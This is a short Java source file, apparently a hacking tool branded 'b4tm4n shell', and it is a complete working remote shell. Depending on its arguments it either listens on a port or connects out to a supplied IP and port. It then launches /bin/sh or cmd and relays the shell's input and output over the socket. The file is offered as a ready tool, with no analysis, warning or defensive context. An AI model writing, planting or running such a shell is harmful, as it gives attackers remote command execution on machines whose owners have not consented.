import java.io.*;
import java.net.*;

public class b4tm4n_rs{
	private static final class pt extends Thread{
		private InputStream is;
		private OutputStream out;

		public pt(InputStream is, OutputStream out){this.is=is;this.out=out;}

		@Override
		public void run(){
			try{
				byte[] b = new byte[8192];
				int c = is.read(b);
				while(c>=0) {
					out.write(b,0,c);
					out.flush();
					c = is.read(b);
				}
			}
			catch(Exception e){e.printStackTrace();}
		}
	}

	public static void main(String[] args){
		int port;
		String cmd = "/bin/sh";
		if(System.getProperty("os.name").toLowerCase().indexOf("win")>=0){cmd = "cmd";}
		String w = "b4tm4n shell : connected\n";
		byte[] b = w.getBytes();
		Socket h = new Socket();
		try{
			if(args.length==1){
				port = Integer.parseInt(args[0]);
				ServerSocket s = new ServerSocket(port);
				h = s.accept();
			}
			else if(args.length==2){
				port = Integer.parseInt(args[0]);
				String ip = args[1];
				h = new Socket(ip, port);
			}
			if(args.length==1 || args.length==2){
				InputStream gis = h.getInputStream();
				OutputStream gos = h.getOutputStream();
				gos.write(b);
				Process p = Runtime.getRuntime().exec(cmd);

				pt p1 = new pt(p.getInputStream(), gos);
				pt p2 = new pt(gis, p.getOutputStream());
				p1.start();p2.start();
			}
		}
		catch(Exception e){e.printStackTrace();}
	}
}